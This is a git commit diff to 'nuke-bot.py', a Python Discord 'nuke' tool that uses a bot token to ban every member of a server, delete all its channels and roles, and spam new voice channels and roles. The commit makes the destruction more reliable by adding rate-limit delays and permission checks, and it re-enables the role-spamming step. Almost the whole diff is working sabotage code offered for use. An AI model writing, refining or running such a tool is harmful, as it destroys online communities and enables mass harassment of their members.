e70387b036afb229c5746e60e443b518ccdf3d93
FASIL503 <139085250+FASIL503@users.noreply.github.com>
2025-03-14 21:28:59 +0300

    Update nuke-bot.py
    .

--- nuke-bot.py
+++ nuke-bot.py
@@ -3,7 +3,14 @@ from discord.ext import commands
 from colorama import init, Fore as cc
 from os import name as os_name, system
 from sys import exit
+import asyncio
+import logging
+
+# Initialize colorama and logging
 init()
+logging.basicConfig(level=logging.INFO)
+
+# Color shortcuts
 dr = DR = r = R = cc.LIGHTRED_EX
 g = G = cc.LIGHTGREEN_EX
 b = B = cc.LIGHTBLUE_EX
@@ -12,9 +19,15 @@ c = C = cc.LIGHTCYAN_EX
 y = Y = cc.LIGHTYELLOW_EX
 w = W = cc.RESET
 
+# Clear screen function
 clear = lambda: system('cls') if os_name == 'nt' else system('clear')
-def _input(text):print(text, end='');return input()
 
+# Input function with color
+def _input(text):
+    print(text, end='')
+    return input()
+
+# Banner
 baner = f'''
 {r} _   _       _       {m} ____        _   
 {r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
@@ -23,16 +36,16 @@ baner = f'''
 {r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
 {y}Made by: {g}https://github.com/Sigma-cc'''
 
-
-
+# Functions for nuking
 async def delete_all_channel(guild):
     deleted = 0
     for channel in guild.channels:
         try:
             await channel.delete()
             deleted += 1
-        except:
-            continue
+            await asyncio.sleep(1)  # Rate limit handling
+        except Exception as e:
+            logging.error(f'Failed to delete channel: {e}')
     return deleted
 
 async def delete_all_roles(guild):
@@ -41,20 +54,24 @@ async def delete_all_roles(guild):
         try:
             await role.delete()
             deleted += 1
-        except:
-            continue
+            await asyncio.sleep(1)  # Rate limit handling
+        except Exception as e:
+            logging.error(f'Failed to delete role: {e}')
     return deleted
 
 async def ban_all_members(guild):
     banned = 0
     for member in guild.members:
         try:
-            await member.ban()
-            banned += 1
-        except:
-            continue
+            if guild.me.guild_permissions.ban_members:
+                await member.ban()
+                banned += 1
+                await asyncio.sleep(1)  # Rate limit handling
+            else:
+                logging.warning(f'Missing permissions to ban members in {guild.name}')
+        except Exception as e:
+            logging.error(f'Failed to ban member: {e}')
     return banned
-
 
 async def create_roles(guild, name):
     created = 0
@@ -62,8 +79,9 @@ async def create_roles(guild, name):
         try:
             await guild.create_role(name=name)
             created += 1
-        except:
-            continue
+            await asyncio.sleep(1)  # Rate limit handling
+        except Exception as e:
+            logging.error(f'Failed to create role: {e}')
     return created
 
 async def create_voice_channels(guild, name):
@@ -72,11 +90,16 @@ async def create_voice_channels(guild, name):
         try:
             await guild.create_voice_channel(name=name)
             created += 1
-        except:
-            continue
+            await asyncio.sleep(1)  # Rate limit handling
+        except Exception as e:
+            logging.error(f'Failed to create voice channel: {e}')
     return created
 
-async def nuke_guild(guild):
+async def nuke_guild(guild, name):
+    confirm = input(f'{r}Are you sure you want to nuke {guild.name}? (y/n): {g}')
+    if confirm.lower() != 'y':
+        return
+
     print(f'{r}Nuke: {m}{guild.name}')
     banned = await ban_all_members(guild)
     print(f'{m}Banned:{b}{banned}')
@@ -84,13 +107,13 @@ async def nuke_guild(guild):
     print(f'{m}Delete Channels:{b}{deleted_channels}')
     delete_roles = await delete_all_roles(guild)
     print(f'{m}Delete Roles:{b}{delete_roles}')
-    created_channels = await create_voice_channels(guild,name)
+    created_channels = await create_voice_channels(guild, name)
     print(f'{m}Create Voice Channels:{b}{created_channels}')
-    #created_roles = await created_roles(guild,name)
-    #print(f'{m}Create Roles:{b}{created_roles}')
+    created_roles = await create_roles(guild, name)
+    print(f'{m}Create Roles:{b}{created_roles}')
     print(f'{r}--------------------------------------------\n\n')
 
-
+# Main loop
 while True:
     clear()
     choice = input(f'''   
@@ -112,7 +135,7 @@ while True:
     {y}└─[2] {m}- {g}Nuke only one server.  
     {y}└─[3] {m}- {g}Exit
 {y}====>{g}''')
-        client = commands.Bot(command_prefix='.',intents=discord.Intents.all())
+        client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
         if choice_type == '1':
             @client.event
             async def on_ready():
@@ -120,7 +143,7 @@ while True:
 [+]Logged as {client.user.name}
 [+]Bot in {len(client.guilds)} servers!''')
                 for guild in client.guilds:
-                    await nuke_guild(guild)
+                    await nuke_guild(guild, name)
                 await client.close()
         elif choice_type == '2':
             guild_id =  _input(f'{y}Input server id:{g}')
@@ -128,7 +151,7 @@ while True:
             async def on_ready():
                 for guild in client.guilds:
                     if str(guild.id) == guild_id:
-                        await nuke_guild(guild)
+                        await nuke_guild(guild, name)
                 await client.close()
         elif choice_type == '3':
             print(f'{dr}Exit...')
@@ -136,11 +159,12 @@ while True:
         try:
             client.run(token)
             input('Nuke finished, press enter for return to menu...')
+        except discord.LoginFailure:
+            input(f'{r}Invalid token\n{b}Press enter to return...')
+        except discord.PrivilegedIntentsRequired:
+            input(f'{r}Intents Error\n{g}For fix -> https://prnt.sc/wmrwut\n{b}Press enter to return...')
         except Exception as error:
-            if error == '''Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.''':
-                input(f'{r}Intents Error\n{g}For fix -> https://prnt.sc/wmrwut\n{b}Press enter for return...')
-            else:
-                input(f'{r}{error}\n{b}Press enter for return...')
+            input(f'{r}{error}\n{b}Press enter to return...')
             continue
     elif choice == '2':
         print(f'{dr}Exit...')
